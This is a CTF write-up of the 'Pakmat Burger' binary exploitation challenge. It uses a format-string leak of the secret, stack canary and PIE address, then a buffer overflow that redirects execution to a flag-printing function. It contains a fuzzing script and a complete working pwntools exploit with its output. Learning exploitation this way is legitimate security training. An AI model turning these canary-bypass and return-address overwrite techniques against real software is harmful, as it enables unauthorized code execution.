---
title: Pakmat Burger
author: capang
date: 2024-01-02 09:30:00 +0800
categories: [Writeups, PWN]
tags: [wargames 2023]
math: true
mermaid: true
---

# Overview

The Pakmat Burger challenge presented a binary exploitation task involving a format string vulnerability and a buffer overflow in an ELF 64-bit executable. The goal was to exploit these vulnerabilities to call a hidden function named `secret_order` that would reveal the flag.

Disclaimer: I didnt get the flag during the competition, i work on it even after the tournament. insane chal for me

## Source File

[Download Source File](/assets/files/pakmatburger.zip)


# file check

```
pakmat_burger: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1dcf760365108f9b32f8e62e50d8e8d01513d398, for GNU/Linux 3.2.0, not stripped
```

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

file in ghidra
main function

```
char * main(void)

{
  int iVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  char local_3e [9];
  char local_35 [10];
  char local_2b [12];
  undefined local_1f [15];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  initialize();
  pcVar2 = getenv("SECRET_MESSAGE");
  if (pcVar2 == (char *)0x0) {
    puts("Error: SECRET_MESSAGE environment variable not set. Exiting...");
    pcVar2 = (char *)0x1;
  }
  else {
    puts("Welcome to Pak Mat Burger!");
    printf("Please enter your name: ");
    __isoc99_scanf(&DAT_001020a3,local_2b);
    printf("Hi ");
    printf(local_2b);
    printf(", to order a burger, enter the secret message: ");
    __isoc99_scanf(&DAT_001020e0,local_3e);
    iVar1 = strcmp(local_3e,pcVar2);
    if (iVar1 == 0) {
      puts("Great! What type of burger would you like to order? ");
      __isoc99_scanf(&DAT_00102155,local_1f);
      getchar();
      printf("Please provide your phone number, we will delivered soon: ");
      pcVar2 = fgets(local_35,100,_stdin);
    }
    else {
      puts("Sorry, the secret message is incorrect. Exiting...");
      pcVar2 = (char *)0x0;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return pcVar2;
}
```


### Vulnerabilities

1. **Format String Vulnerability**: There is a format string vulnerability when you enter the name, if entered correctly we can get the secret message
2. **Buffer Overflow**: Buffer overflow vulnerability since has size local_35 10 only but it accepts 0x100
### Target Function

The `secret_order` function is our target to execute:

```C
void secret_order(void)

{
  system("cat ./flag.txt");
  return;
}
```

# Solution

Leak these values using format string attack:
- Secret Message
- CANARY
- Any PIE address (we can use this to find the base PIE address)

Using fuzz script

```python
from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pakmat_burger', checksec=False)


os.environ["SECRET_MESSAGE"] = "YOKO"

# Let's fuzz 25 values
for i in range(1,25):
    try:
        p = process(level='error')
        p.sendlineafter(b': ', '%{}$s'.format(i).encode())
        result = p.recv().split(b' ')
        result = result[1].split(b',')
        leak_char = result[0].ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass

```
{: file='fuzz.py'}

we can get the secret message

```bash
$ python fuzz.py 
1: b'Hi\x00\x00\x00\x00\x00\x00'
2: b'(null)\x00\x00'
3: b'(null)\x00\x00'
4: b'\x00\x00\x00\x00\x00\x00\x00\x00'
5: b'\x8b\x00\x00\x00\x00\x00\x00\x00'
6: b'YOKO\x00\x00\x00\x00'
7: b'(null)\x00\x00'
8: b'(null)\x00\x00'
9: b'\x00\x00\x00\x00\x00\x00\x00\x00'
10: b'\x00\x00\x00\x00\x00\x00\x00\x00'
11: b'(null)\x00\x00'
12: b'(null)\x00\x00'
13: b'\x00\x00\x00\x00\x00\x00\x00\x00'
14: b'\x00\x00\x00\x00\x00\x00\x00\x00'
15: b'\x89\xc7\xe8\x9fs\x01\x00\x00'
16: b'(null)\x00\x00'
17: b'\xf3\x0f\x1e\xfaUH\x89\xe5H\x83\xec@dH\x8b\x04%('
18: b'\x00\x00\x00\x00\x00\x00\x00\x00'
19: b'\x80\x11\xa1j\xfe\x7f\x00\x00'
20: b'\x80\x01k\xcc\xfe\x7f\x00\x00'
21: b'\x00\x00\x00\x00\x00\x00\x00\x00'
22: b'(null)\x00\x00'
23: b'\xc5\x11\xd6\xb9\xff\x7f\x00\x00'
24: b'\x80\xa2\x1a\xd5jU\x00\x00'
```

its on %6$s

changing from %s to %p we can try to find the canary values and main address

```python
$ python fuzz.py 
1: b'0x7ffc4a4aa570'
2: b'(nil)\x00\x00\x00'
3: b'(nil)\x00\x00\x00'
4: b'0x4\x00\x00\x00\x00\x00'
5: b'0x7f01191c0aa0'
6: b'0x7ffc7ecb1fae'
7: b'(nil)\x00\x00\x00'
8: b'(nil)\x00\x00\x00'
9: b'0x2439250000000000'
10: b'0x7024\x00\x00'
11: b'(nil)\x00\x00\x00'
12: b'(nil)\x00\x00\x00'
13: b'0xce7df4b5024c6b00'
14: b'0x1\x00\x00\x00\x00\x00'
15: b'0x7fc39c62a6ca'
16: b'(nil)\x00\x00\x00'
17: b'0x55817ada0374'
18: b'0x100000000'
19: b'0x7ffeb3a272a8'
20: b'0x7ffe4b955088'
21: b'0x4ecced99680d75cf'
22: b'(nil)\x00\x00\x00'
23: b'0x7fff875ae308'
24: b'0x559e87235d50'
```

doing this multiple times we can say that 
- %13$p is the canary value (00 at the end)
- %17$p is the main address (not 0x7f or 0xff at the start and seems like legit address value)
we can confirm our main address using gdb

```python
pwndbg> tele $rsp 30
00:0000│ rsp 0x7fffffffdc60 —▸ 0x7fffffffedd9 ◂— 0x474458006f6b6f79 /* 'yoko' */
01:0008│-038 0x7fffffffdc68 ◂— 0x0
02:0010│-030 0x7fffffffdc70 ◂— 0x0
03:0018│-028 0x7fffffffdc78 ◂— 0x610000000000
04:0020│-020 0x7fffffffdc80 ◂— 0x0
... ↓        2 skipped
07:0038│-008 0x7fffffffdc98 ◂— 0xcb1f6510ae22e500
08:0040│ rbp 0x7fffffffdca0 ◂— 0x1
09:0048│+008 0x7fffffffdca8 —▸ 0x7ffff7def6ca (__libc_start_call_main+122) ◂— mov edi, eax
0a:0050│+010 0x7fffffffdcb0 ◂— 0x0
0b:0058│+018 0x7fffffffdcb8 —▸ 0x555555555374 (main) ◂— endbr64 
0c:0060│+020 0x7fffffffdcc0 ◂— 0x100000000
```

```python
pwndbg> p 0x7fffffffdc60-0x7fffffffdcb8
$1 = -88
```

since top of the stack is the secret message, and %6$p is the start of rsp

```python
>>> 88//8 + 6
17
```

we can confirm that %17$p is the main address

### Key Findings

- The secret message is found at `%6$s`.
- The canary value is at `%13$p`.
- A PIE address is at `%17$p`.

### finding padding till canary

```python
Stack[-0x10] canary
Stack[-0x35] buffer
```

using ghidra it will show the offsets of buffer and canary
we can find the distance between

```python
>>> 0x35 - 0x10
37
>>> hex(37)
'0x25'
```

To find the padding from padding + canary, we need to understand the stack arrangment

```
+-----------------+
|                 |
| local variables |
|                 |
+-----------------+
|  stack canary   |
+-----------------+
|    saved RBP    |
+-----------------+
| return address  |
+-----------------+
```

so after the canary it will be the saved RBP
so the padding will be 8 characters

## exploit

The final exploit will look like this

```python
padding = b'a'*37
payload = padding + canary + b'b'*8 + elf.symbols.secret_order
```

Complete exploit

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './pakmat_burger'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
os.environ["SECRET_MESSAGE"] = "YOKO"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


io = start()


secret = b"YOKO"
io.sendlineafter(b"Please enter your name:",b"%17$p%13$p")
io.recvuntil(b"Hi ")
main_addr = int(io.recv(14).decode(),16)
log.info("main_addr: " + hex(main_addr))


canary = int(io.recv(18).decode(),16)
log.info("CANARY: " + hex(canary))

elf.address = main_addr - elf.symbols.main
log.info("PIE: " + hex(elf.address))
io.sendlineafter(b"enter the secret message:",secret)
io.sendlineafter(b"order?",b"abcd")

secret_order = elf.symbols.secret_order

payload = b"A" * 0x25 + p64(canary) + b"B" * 8 + p64(secret_order + 5)

io.sendlineafter(b": ", payload)
io.interactive()
```
{: file='exploit.py'}

Output
```python
$ python exploit.py 
[+] Starting local process './pakmat_burger': pid 45526
[*] main_addr: 0x55694acbe374
[*] CANARY: 0xfe2644d1c4032a00
[*] PIE: 0x55694acbd000
[*] Switching to interactive mode
flag{fake}Welcome to Pak Mat Burger!
```

## Conclusion
- I learnt how to
	- finding canary value
	- bypass stack canary 
	- find PIE base address
- progress during the competition
	- I find the secret message which is '8d7e88a8'
	- Took me ages to finish this chal :< 
	- Tq Wargames for this amazing challenge
